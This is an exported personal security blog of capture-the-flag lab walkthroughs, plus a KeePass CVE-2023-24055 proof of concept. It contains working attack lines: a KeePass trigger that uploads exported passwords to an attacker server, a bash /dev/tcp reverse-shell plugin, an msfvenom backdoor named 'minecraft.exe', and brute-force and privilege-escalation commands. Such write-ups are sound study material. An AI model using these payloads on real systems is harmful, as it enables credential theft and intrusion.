{"meta":{"title":"Peanutstick","subtitle":"","description":"","author":"Peanutstick","url":"https://peanutstick.github.io","root":"/"},"pages":[],"posts":[{"title":"CTF Wgel CTF","slug":"CTF_Wgel_CTF","date":"2023-02-05T18:20:02.000Z","updated":"2023-02-05T09:37:58.166Z","comments":true,"path":"/post/CTF_Wgel_CTF.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Wgel_CTF.html","excerpt":"","text":"Rustscanrustscan -a 10.10.227.219 Browse the websiteThis is the default page. We have a user, Jessie Gobustergobuster dir -u http://10.10.227.219/. -x txt,html,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Let’s run an anoter scan in sitemap.I’ve tries with the same wordlist but nothing came out.So I’m using an another one. gobuster dir -u http://10.10.227.219/sitemap -x txt,html,php -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt Download id_rsa wget http://10.10.227.219/sitemap/.ssh/id_rsa SSHchmod 600 id_rsa ssh -i id_rsa jessie@10.10.227.219 First flagThere is no tabulation. root flagsudo /usr/bin/wget -i /root/root_flag.txt https://gtfobins.github.io/gtfobins/wget/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Year of the Rabbit","slug":"CTF_Year of the Rabbit","date":"2023-02-02T18:20:02.000Z","updated":"2023-02-02T12:55:47.795Z","comments":true,"path":"/post/CTF_Year of the Rabbit.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Year%20of%20the%20Rabbit.html","excerpt":"","text":"rustscanrustscan -a 10.10.101.203 PORT STATE SERVICE REASON21/tcp open ftp syn-ack22/tcp open ssh syn-ack80/tcp open http syn-ack gobustergobuster dir -u http://10.10.101.203 -x txt,html,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Inside style.css: sup3r_s3cr3t_fl4g.phpI’m forced to watch it.He say, your looking at the wrong place.So open burpsuit:http://10.10.101.203/WExYY2Cv-qU/ is the hiden directory. This is the picture:I donwload it and do a strings on it.We have a user with lot of passwords, let’s try them with hydra. Crack FTPuser: ftpuser hydra -l ftpuser -P passwords.txt ftp://10.10.101.203 -V password: 5iez1wGXKfPKQ Connect to ftp File: Eli&#39;s_Creds.txtBrainfuckhttps://www.dcode.fr/brainfuck-language User: eliPassword: DSpDiM1wAEwid SSH Gwendoline is a user ?I don’t have the time to to the rest. I’m going back to work in few minutes.But I saw this file who can be interesing:I will continue later.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CVE-2023-24055 KeePass 2.5x","slug":"CVE-2023-24055_KeePass_2.5x","date":"2023-01-31T04:15:52.000Z","updated":"2023-01-30T21:55:31.750Z","comments":true,"path":"/post/CVE-2023-24055_KeePass_2.5x.html","link":"","permalink":"https://peanutstick.github.io/post/CVE-2023-24055_KeePass_2.5x.html","excerpt":"","text":"I’m not the author of this POC.https://github.com/alt3kx/CVE-2023-24055_PoC Connect to the targetShow directories. smbclient -L //192.168.1.182 Connect to shared directory. smbclient \\\\\\\\192.168.1.182\\\\Roaming Download the configget KeePass\\KeePass.config.xml This is how looks like the file. Add a triggerThe POC: &lt;Triggers> &lt;Trigger> &lt;Guid>lztpSRd56EuYtwwqntH7TQ==&lt;/Guid> &lt;Name>exploit&lt;/Name> &lt;Events> &lt;Event> &lt;TypeGuid>s6j9/ngTSmqcXdW6hDqbjg==&lt;/TypeGuid> &lt;Parameters> &lt;Parameter>0&lt;/Parameter> &lt;Parameter /> &lt;/Parameters> &lt;/Event> &lt;/Events> &lt;Conditions /> &lt;Actions> &lt;Action> &lt;TypeGuid>D5prW87VRr65NO2xP5RIIg==&lt;/TypeGuid> &lt;Parameters> &lt;Parameter>c:\\Users\\John\\AppData\\Local\\Temp\\exploit.xml&lt;/Parameter> # This one &lt;Parameter>KeePass XML (2.x)&lt;/Parameter> &lt;Parameter /> &lt;Parameter /> &lt;/Parameters> &lt;/Action> &lt;Action> &lt;TypeGuid>2uX4OwcwTBOe7y66y27kxw==&lt;/TypeGuid> &lt;Parameters> &lt;Parameter>PowerShell.exe&lt;/Parameter> &lt;Parameter>-ex bypass -noprofile -c Invoke-WebRequest -uri http://attacker_server_here/exploit.raw -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\\Users\\John\\AppData\\Local\\Temp\\exploit.xml'))) &lt;/Parameter> # And this one &lt;Parameter>False&lt;/Parameter> &lt;Parameter>1&lt;/Parameter> &lt;Parameter /> &lt;/Parameters> &lt;/Action> &lt;/Actions> &lt;/Trigger> &lt;/Triggers> I have to change 2 lines.The first one to replace by the user of the windows.The second for the same ting + give the address of the web server.This is my version: ... &lt;Parameters> &lt;Parameter>c:\\Users\\peanutstick\\AppData\\Local\\Temp\\exploit.xml&lt;/Parameter> # This one &lt;Parameter>KeePass XML (2.x)&lt;/Parameter> ... ... &lt;Parameter>PowerShell.exe&lt;/Parameter> &lt;Parameter>-ex bypass -noprofile -c Invoke-WebRequest -uri http://192.168.1.69:1337/exploit.raw -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\\Users\\peanutstick\\AppData\\Local\\Temp\\exploit.xml'))) &lt;/Parameter> # And this one &lt;Parameter>False&lt;/Parameter> ... Put it back in the target. Create a web serverWe need a web server where we can user PUT method.This one is good:https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7Now we have to open it and wait, the windows user need to save a new passwordAnd Voila, with the file in base 64 Decodeecho \"string\" | base64 -d > passwords.txt","categories":[{"name":"Security","slug":"Security","permalink":"https://peanutstick.github.io/categories/Security/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Ignite","slug":"Ignite","date":"2023-01-29T17:20:02.000Z","updated":"2023-01-29T11:27:32.547Z","comments":true,"path":"/post/Ignite.html","link":"","permalink":"https://peanutstick.github.io/post/Ignite.html","excerpt":"","text":"rustscan Gobustergobuster dir -u http://10.10.219.98 -x txt,html,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Not interesting. Robots.txtIt’s the login page of the CMSThe config file is here: User password of the login pageSo if I user admin:admin in the login page it’s working.Useless, let’s searsh for an exploit. revershellhttps://github.com/AssassinUKG/fuleCMS Upgrade my shell: python -c 'import pty; pty.spawn(\"/bin/bash\")' Enum with linpeasMy computer:Target:Then run it. chmod +x l* ./l* Linpeas is maybe overkill for this box, lse.sh is good for this kind of box. CVECan be root in a sec with this exploit. Password in config fileLet’s try it on rootThe CTF is over.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Learn CTF on windows","slug":"Learn CTF on windows","date":"2023-01-14T18:26:00.000Z","updated":"2023-01-15T10:28:52.669Z","comments":true,"path":"/post/Learn CTF on windows.html","link":"","permalink":"https://peanutstick.github.io/post/Learn%20CTF%20on%20windows.html","excerpt":"","text":"HowI don’t like courses, if I don’t look for the information myself it’s not effective.So I’m going to look for beginner’s articles, find the tools and read what it does on github.While I read it, I will write it here and at the end on the day I will do a CTF on windows. Let’s begin: How to search on googleIt’s not nessesary, but I would like to share how I do it.it’s not amazing but I saw too many ppl who write the full sentence on google with uppercase, punctuation and potency formula… How I do: Few words (subject, verb): windows ctf writeup windows ctf boot to root boot to root windows writeur hack the box windows We don’t care of the order of the words Middle click on every links to open the in a new tab Scroll very fast without reading on the first one, if I feel like it’s useless (ctrl+w) You can also search for the word windows . And there is the interesting links: https://cybergladius.com/htb-walkthrough-support/ https://www.hackingarticles.in/writer-hackthebox-walkthrough/ https://systemweakness.com/flatline-windows-hacking-tryhackme-ctf-ac57b03a80a1 https://www.youtube.com/watch?v=iIveZ-raTTQ&amp;list=PLidcsTyj9JXL4Jv6u9qi8TcUgsNoKKHNn https://haax.fr/fr/walkthroughs/hackthebox/remote/ It’s enough, let’s start working. Find sub domaindig @$ip +short support.htp any If you find somethign you have to white it in the /etc/hosts. Sambasmbclient -N -L \\\\\\\\$IP -L to list-N to supress password promptIt will work only if the guest login is ennabled. Then : smbclient -N \\\\\\\\$ip\\\\share Now you can use ? to display the commands, I mainly use get, ls and dir. To download all the files in a directory: Smetimes mask is not needed. SMB:> mask \"\" SMB:> recurse ON SMB:> prompt OFF SMB:> mget * Mount it: mkdir /mnt/ctf mount -t cifs //10.10.10.192/profiles$ /mnt/ctf Exect an exe file on linuxWith nono or wine64. I don’t know nono.I don’t care about this step let’s continue. LDAP EnumerationHe use ldapsearch but he only give one exemple so I’m searching somewhere else.https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/I will install it: sudo pacman -S openldap https://wiki.archlinux.org/title/OpenLDAPhttps://access.redhat.com/documentation/en-us/red_hat_directory_server/11/html/administration_guide/examples-of-common-ldapsearcheshttps://0xdf.gitlab.io/tags#ldapsearchExemples ldapsearch -H ldap://blackfield.local:389 -x -b DC=blackfield,DC=LOCAL ldapsearch -h support.htb -x -s base namingcontexts ldapsearch -h support.htb -x -b \"DC=support,DC=htb\" ldapsearch -h support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b \"DC=support,DC=htb\"| less # Without auth ldapsearch -h 10.10.11.168 -x -s base namingcontexts # With auth ldapsearch -h 10.10.11.129 -D 'hope.sharp@search.htb' -w \"IsolationIsKey?\" -b \"DC=search,DC=htb\" # I don't understand this one ldapsearch -h 127.0.0.1 -x -b 'dc=htb' -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w 'J~42%W?PFHl]g' crackmapexecCrackMapExec shows the full OS information: oxdf@parrot$ crackmapexec smb 10.10.10.248 SMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) So, if the dig is not working you can use this, I think you should use both.You can also see if the SMBv1 is enabled. smbmapI don’t see the difference with smbclient Backdoorhttps://www.youtube.com/watch?v=Nt0CE3Km8NwTargert = 192.168.5.115me = 192.168.5.128 msfvenom -p windowd/meterpreter/reverse-tcp LHOST=$me LPORT=$myport -f exe > minecraft.exe So, if you can upload something you can upload a backdoor. rpcclientit’s the RDP Connectrpcclient -U '' -N $IP Enum usersenumdomusers Clear the output: cat users.txt | awk -F\\[ '&#123;print $2&#125;' | awk -F \\] '&#123;print $1&#125;' > valid_users.txt Then in the CTF he use ldpsearch to find the password, decode it. crackmapexecThen he use the list of users to brute force the smb with the valid password and the tool crackmapexec.I need it. yay -S crackmapexec wow, only for one tool… Ok… I will install it later.later: yay -S crackmapexec --overwrite '*' Then he brute force.https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/ SharpHoundIt’s used to enum for privesc","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Relevant","slug":"CTF_Relevant","date":"2023-01-13T10:18:57.202Z","updated":"2023-01-14T11:25:54.918Z","comments":true,"path":"/post/CTF_Relevant.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Relevant.html","excerpt":"","text":"Pingttl=127, it’s windows rustscanrustscan -a 10.10.177.26 --ulimit 5000 I have to use nmap with the flag -sV. nmapnmap -A -sC -sV -p- -script=vuln 10.10.177.26 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-01-13 11:30 CET Pre-scan script results: | broadcast-avahi-dos: | Discovered hosts: | 224.0.0.251 | After NULL UDP avahi packet DoS (CVE-2011-1002). |_ Hosts are all up (not vulnerable). Not shown: 65528 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80&#x2F;tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS&#x2F;10.0 |_http-dombased-xss: Couldn&#39;t find any DOM based XSS. |_http-csrf: Couldn&#39;t find any CSRF vulnerabilities. |_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities. 135&#x2F;tcp open msrpc Microsoft Windows RPC 139&#x2F;tcp open netbios-ssn Microsoft Windows netbios-ssn 3389&#x2F;tcp open ms-wbt-server Microsoft Terminal Services 49663&#x2F;tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS&#x2F;10.0 |_http-dombased-xss: Couldn&#39;t find any DOM based XSS. |_http-csrf: Couldn&#39;t find any CSRF vulnerabilities. |_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities. 49667&#x2F;tcp open msrpc Microsoft Windows RPC 49669&#x2F;tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows Host script results: |_smb-vuln-ms10-054: false |_samba-vuln-cve-2012-1182: SMB: Couldn&#39;t find a NetBIOS name that works for the server. Sorry! |_smb-vuln-ms10-061: SMB: Couldn&#39;t find a NetBIOS name that works for the server. Sorry! | smb-vuln-cve2009-3103: | VULNERABLE: | SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497) | State: VULNERABLE | IDs: CVE:CVE-2009-3103 | Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2, | Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a | denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE | PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location, | aka &quot;SMBv2 Negotiation Vulnerability.&quot; | | Disclosure date: 2009-09-08 | References: | https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;CVE-2009-3103 |_ http:&#x2F;&#x2F;www.cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;CVE-2009-3103 Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; . Nmap done: 1 IP address (1 host up) scanned in 697.34 seconds","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Bypass yt restriction","slug":"Bypass yt restriction","date":"2023-01-12T21:25:02.000Z","updated":"2023-01-15T10:32:39.998Z","comments":true,"path":"/post/Bypass yt restriction.html","link":"","permalink":"https://peanutstick.github.io/post/Bypass%20yt%20restriction.html","excerpt":"","text":"DISPLAY=:0 mpv https://www.youtube.com/watch?v=50nlHgRYp1I --slang=en --fs --ytdl-raw-options=ignore-config=,sub-lang=en,write-auto-sub=","categories":[{"name":"Tips","slug":"Tips","permalink":"https://peanutstick.github.io/categories/Tips/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF  Daily Bugle","slug":"Daily Bugle","date":"2023-01-12T18:20:02.000Z","updated":"2023-01-15T10:29:14.605Z","comments":true,"path":"/post/Daily Bugle.html","link":"","permalink":"https://peanutstick.github.io/post/Daily%20Bugle.html","excerpt":"","text":"rustscanrustscan -a 10.10.56.151 --ulimit 5000 robots.txthttp://10.10.56.151/robots.txt User-agent: * Disallow: &#x2F;administrator&#x2F; Disallow: &#x2F;bin&#x2F; Disallow: &#x2F;cache&#x2F; Disallow: &#x2F;cli&#x2F; Disallow: &#x2F;components&#x2F; Disallow: &#x2F;includes&#x2F; Disallow: &#x2F;installation&#x2F; Disallow: &#x2F;language&#x2F; Disallow: &#x2F;layouts&#x2F; Disallow: &#x2F;libraries&#x2F; Disallow: &#x2F;logs&#x2F; Disallow: &#x2F;modules&#x2F; Disallow: &#x2F;plugins&#x2F; Disallow: &#x2F;tmp&#x2F; jumlahttp://10.10.56.151//htaccess.txtwe are in 2023, there is few CVE here. https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html http://10.10.56.151/index.php?option=com_fields&amp;view=fields&amp;layout=modal sqlihttps://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py Found user [&#39;811&#39;, &#39;Super User&#39;, &#39;jonah&#39;, &#39;jonah@tryhackme.com&#39;, &#39;$2y$10$0veO&#x2F;JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#39;, &#39;&#39;, &#39;&#39;] Crack the hashhashcat -m 3200 hash /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt Output: $2y$10$0veO&#x2F;JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123 jonah:spiderman123 revershellhttps://www.hackingarticles.in/joomla-reverse-shell/in error.phpthen10.10.56.151/index.php/zefzef lse polkit","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Internal","slug":"CTF_Internal","date":"2023-01-11T18:20:02.000Z","updated":"2023-01-15T10:28:44.135Z","comments":true,"path":"/post/CTF_Internal.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Internal.html","excerpt":"","text":"rustscanrustscan -a 10.10.155.73 --ulimit 5000 GObustergobuster dir -u http://10.10.155.73/ -x txt,html,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /etc/hosts10.10.155.73 internal.thm http://internal.thm/blog/ Wordpress wpscan --url http://internal.thm/blog --enumerate u WordPress version 5.4.2 bruteforcewpscan -v -U admin -P Documents/arch_doc/CTF/Wordlist/rockyou.txt --url http://internal.thm/blog/wp-login.php Useless Reversehellvia error 404 of template LSE Polkit CVE, no need to think, let’s pwn it. Plokithttps://github.com/joeammond/CVE-2021-4034 I’m root ConclusionThis box was “hard” but still easier than easy box of HTB.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Mr Robot","slug":"CTF_Mr_Robot_HTB","date":"2023-01-09T01:51:02.000Z","updated":"2023-01-15T10:28:35.345Z","comments":true,"path":"/post/CTF_Mr_Robot_HTB.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Mr_Robot_HTB.html","excerpt":"","text":"nmapClosed but it’s ok, THM take lot of time to load Gobusterwordpress loginhttp://10.10.185.72/wp-login.php robots.txt So… Wordpress Find the userhydra -L fsocity.dic -p admin 10.10.185.72 -V http-form-post \"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.10.185.72%2Fwp-admin%2F&amp;testcookie=1:F=Invalid username.\" Find the passwordwpscan -v -U user.txt -P fsocity.dic.sort --url http:&#x2F;&#x2F;10.10.185.72&#x2F;wp-login.php Revershellzip it, send it, listen and activate. Robotmd5 rootlse.shlse.sh is in my current directory. /usr/local/bin/nmap nmap exploithttps://gtfobins.github.io/gtfobins/nmap/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Crocc Crew","slug":"Crocc Crew","date":"2022-12-23T07:02:40.265Z","updated":"2022-12-23T07:28:45.848Z","comments":true,"path":"/post/Crocc Crew.html","link":"","permalink":"https://peanutstick.github.io/post/Crocc%20Crew.html","excerpt":"","text":"nmapnmap -sV -A -T4 -Pn --min-rate 5000 10.10.130.135 -sV: Probe open ports to determine service/version info-A: Enable OS detection, version detection, script scanning, and traceroute-T&lt;0-5&gt;: Set timing template (higher is faster)-Pn: Treat all hosts as online – skip host discovery Output: PORT STATE SERVICE VERSION 53&#x2F;tcp open domain? 80&#x2F;tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS&#x2F;10.0 | http-methods: |_ Potentially risky methods: TRACE 88&#x2F;tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-23 07:06:51Z) 135&#x2F;tcp open msrpc Microsoft Windows RPC 139&#x2F;tcp open netbios-ssn Microsoft Windows netbios-ssn 389&#x2F;tcp open ldap Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name) 445&#x2F;tcp open microsoft-ds? 464&#x2F;tcp open kpasswd5? 593&#x2F;tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636&#x2F;tcp open tcpwrapped 3389&#x2F;tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName&#x3D;DC.COOCTUS.CORP | Not valid before: 2022-12-22T07:06:30 |_Not valid after: 2023-06-23T07:06:30 |_ssl-date: 2022-12-23T07:09:48+00:00; 0s from scanner time. | rdp-ntlm-info: | Target_Name: COOCTUS | NetBIOS_Domain_Name: COOCTUS | NetBIOS_Computer_Name: DC | DNS_Domain_Name: COOCTUS.CORP | DNS_Computer_Name: DC.COOCTUS.CORP | Product_Version: 10.0.17763 |_ System_Time: 2022-12-23T07:09:08+00:00 Service Info: Host: DC; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows Host script results: | smb2-time: | date: 2022-12-23T07:09:12 |_ start_date: N&#x2F;A | smb2-security-mode: | 311: |_ Message signing enabled and required Port 80http://10.10.130.135/Ouptut: User-Agent: * Disallow: &#x2F;robots.txt &#x2F;db-config.bak &#x2F;backdoor.php http://10.10.130.135/db-config.bak Output: &lt;?php $servername &#x3D; &quot;db.cooctus.corp&quot;; $username &#x3D; &quot;C00ctusAdm1n&quot;; $password &#x3D; &quot;B4dt0th3b0n3&quot;; &#x2F;&#x2F; Create connection $conn &#x3D; new mysqli($servername, $username, $password); &#x2F;&#x2F; Check connection if ($conn-&gt;connect_error) &#123; die (&quot;Connection Failed: &quot; .$conn-&gt;connect_error); &#125; echo &quot;Connected Successfully&quot;; ?&gt;% Port 135rdesktop -u \"\" 10.10.130.135 -g 1440x900 Output Port 445smbclient \\\\\\\\10.10.236.52\\\\Home -U \"Visitor\" Output:First flag in user.txt Port 389python -m ldapdomaindump 10.10.130.135 -u 'COOCTUS.corp\\Visitor' -p","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Init","slug":"CTF_Init","date":"2022-11-13T11:14:10.995Z","updated":"2022-11-20T19:01:08.083Z","comments":true,"path":"/post/CTF_Init.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Init.html","excerpt":"","text":"netdiscoversudo netdiscover 192.168.0.16 rustscanrustscan -a 192.168.0.16 Output: PORT STATE SERVICE REASON 80&#x2F;tcp open http syn-ack 111&#x2F;tcp open rpcbind syn-ack 3306&#x2F;tcp open mysql syn-ack 42898&#x2F;tcp open unknown syn-ack Gobustergobuster dir -u http://192.168.0.16/ -x txt,bak,old,html,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Output: &#x2F;index.php (Status: 200) [Size: 332] &#x2F;login.php (Status: 200) [Size: 250] &#x2F;images (Status: 301) [Size: 313] [--&gt; http:&#x2F;&#x2F;192.168.0.16&#x2F;images&#x2F;] &#x2F;upload.php (Status: 200) [Size: 19] &#x2F;upload (Status: 301) [Size: 313] [--&gt; http:&#x2F;&#x2F;192.168.0.16&#x2F;upload&#x2F;] &#x2F;config.php (Status: 200) [Size: 0] &#x2F;server-status (Status: 403) [Size: 300] HTTPhttp:&#x2F;&#x2F;192.168.0.16&#x2F;index.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;config Output: PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8 Decode: echo &quot;PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+&quot; |base64 --decode | kent | Sld6WHVCSkpOeQ&#x3D;&#x3D; | | mike | U0lmZHNURW42SQ&#x3D;&#x3D; | | kane | aVN2NVltMkdSbw&#x3D;&#x3D; | Decode: Kent: JWzXuBJJNy mike: iSv5Ym2GRo kane: iSv5Ym2GRo","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF SecretRezip","slug":"CTF_SecretRezip","date":"2022-11-10T19:25:36.764Z","updated":"2022-11-20T19:01:29.603Z","comments":true,"path":"/post/CTF_SecretRezip.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_SecretRezip.html","excerpt":"","text":"Understand it grep --color=auto -rnw '.' -ie \"HTB\" --color=always 2> /dev/null So we are exporting 2 variables, The flag and the PasswordIt will be too hard to find the password, and he change every time.I’m searching for an another file. grep --color=auto -rnw '.' -ie \"FLAG\" --color=always 2> /dev/null ./src/src/routes.js Zip structureThe ingredients in the web page in in fact the flag, the flag should start with Secret HTB&#123; .There is no encryption.Signature:The signature of the local file header. This is always ‘\\x50\\x4b\\x03\\x04’.Compression method:00: no compression And this is what I have if I enter nohing in the ingredinents field:Iv’e downloaded multiple files with different Ingredients:https://i.imgur.com/y05ptiD.png So I will try Secret: H, Secret: HT and Secret: HTB Secret: H:Secret: HTSecret: HTB3C is everywhere, let’s do a misstake.Secret: HTC Now we have 3D, instead of 3CI will now find a way to get this value only. xxd Secret:\\ HTB.zip |awk '&#123;print $3&#125;'| sed -n 2p Download via bashCopy as curl commandand add -O for output: curl 'http://167.71.131.210:31269/ingredients' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/json' -H 'Origin: http://167.71.131.210:31269' -H 'Connection: keep-alive' -H 'Referer: http://167.71.131.210:31269/' --data-raw '&#123;\"ingredients\":\"dfgdfg\"&#125;' -O Script itI will try something like this:not 3200 but 3c00. Download it Check it Generate charsI have to set the i at 21 because there is no chars beffor. Try the charLet’s try it and guess the first next char only.Let’s try it: Finish the scriptThe else is useless, I will remove the echo too.I just keep the echo at line 17 to show the response.Line 16 I add the good char to the string. And voila","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Hackfest 2016","slug":"Hackfest 2016","date":"2022-10-26T18:21:07.411Z","updated":"2022-10-26T20:14:16.771Z","comments":true,"path":"/post/Hackfest 2016.html","link":"","permalink":"https://peanutstick.github.io/post/Hackfest%202016.html","excerpt":"","text":"netdiscover192.168.0.24 nmaprustscan -sV -p- 192.168.0.24 Output: PORT STATE SERVICE VERSION 22&#x2F;tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0) 53&#x2F;tcp open domain ISC BIND 9.8.1-P1 80&#x2F;tcp open http Apache httpd 2.2.22 ((Ubuntu)) 110&#x2F;tcp open pop3? 139&#x2F;tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 143&#x2F;tcp open imap Dovecot imapd 445&#x2F;tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 993&#x2F;tcp open ssl&#x2F;imap Dovecot imapd 995&#x2F;tcp open ssl&#x2F;pop3s? Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Port 80http://192.168.0.24/robots.txt Disallow: Hackers Allow: &#x2F;wordpress&#x2F; ____ # &#x2F;___ \\_ _ __ _ ___ __ _ _ __ # &#x2F;&#x2F; &#x2F; &#x2F; | | |&#x2F; _&#96; |&#x2F; _ \\ &#x2F; _&#96; | &#39;__| #&#x2F; \\_&#x2F; &#x2F;| |_| | (_| | (_) | (_| | | #\\___,_\\ \\__,_|\\__,_|\\___&#x2F; \\__,_|_| http://192.168.0.24/wordpress/ wpscan --url http://192.168.0.24/wordpress/ --enumerate u Version: Server: Apache&#x2F;2.2.22 (Ubuntu) X-Powered-By: PHP&#x2F;5.3.10-1ubuntu3 Users: wpuser admin:admin http://192.168.0.24/upload/We found the creds, admin:admin.Let’s upload a revers shell. &lt;?php /** * Plugin Name: Reverse Shell Plugin * Plugin URI: * Description: Reverse Shell Plugin * Version: 1.0 * Author: Vince Matteo * Author URI: http://peanutstick.githubio.com */ exec(\"/bin/bash -c 'bash -i >&amp; /dev/tcp/192.168.0.25/4848 0>&amp;1'\"); ?> Listen: nc -nlvp 4848 lse.shOh no no no. [!] ret060 Can we write to executable paths present in cron jobs........... yes! --- &#x2F;etc&#x2F;cron.d&#x2F;php5:09,39 * * * * root [ -x &#x2F;usr&#x2F;lib&#x2F;php5&#x2F;maxlifetime ] &amp;&amp; [ -d &#x2F;var&#x2F;lib&#x2F;php5 ] &amp;&amp; find &#x2F;var&#x2F;lib&#x2F;php5&#x2F; -depth -mindepth 1 -maxdepth 1 -type f -cmin 